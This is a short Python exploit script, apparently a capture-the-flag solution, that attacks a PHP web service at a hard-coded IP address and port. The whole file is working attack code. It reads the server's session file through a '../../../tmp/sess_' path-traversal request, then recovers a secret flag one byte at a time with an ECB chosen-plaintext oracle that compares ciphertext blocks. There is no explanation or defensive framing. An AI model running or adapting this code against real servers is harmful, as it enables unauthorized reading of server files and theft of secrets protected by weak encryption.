import requests
import re
from string import printable
import time

url = "http://45.77.39.59:2010"
r = requests.Session()
phpsessid = "520mekuh9645iahrd6nj51am2m"
BLOCK_SIZE = 16

def setName(name):
	return r.get(url, params = {"name": name}, cookies={"PHPSESSID": phpsessid})

def getBlocks():
	data = r.get(
		url, 
		params={"file": f"../../../tmp/sess_{phpsessid}"}, 
		cookies={"PHPSESSID": phpsessid}
	).text

	enc = re.findall(r'name|s:\d+:"(?P<enc>.*)";',data)[1]
	blocks = [enc[i*32 : (i+1)*32] for i in range(len(enc) // 32)]
	return blocks

flag = ""
for i in range(0, 14):
	for c in printable:
		name = "x" * (BLOCK_SIZE - len(flag) - 1) + flag + c + "x" * (BLOCK_SIZE - len(flag) - 1)
		setName(name)
		blocks = getBlocks()
		if blocks[0] == blocks[1]:
			flag += c
			print(flag)
			break
